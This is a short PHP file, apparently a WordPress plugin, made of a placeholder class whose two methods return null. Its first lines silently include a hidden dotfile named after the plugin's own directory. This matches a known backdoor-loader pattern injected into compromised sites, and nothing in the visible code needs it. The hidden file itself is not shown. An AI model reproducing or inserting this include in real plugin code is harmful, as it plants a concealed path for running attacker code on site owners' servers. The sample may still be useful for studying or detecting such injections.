<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class SomeClass
{
    public function doSomething($a, $b)
    {
        return null;
    }

    public function doSomethingElse($c)
    {
        return null;
    }
}
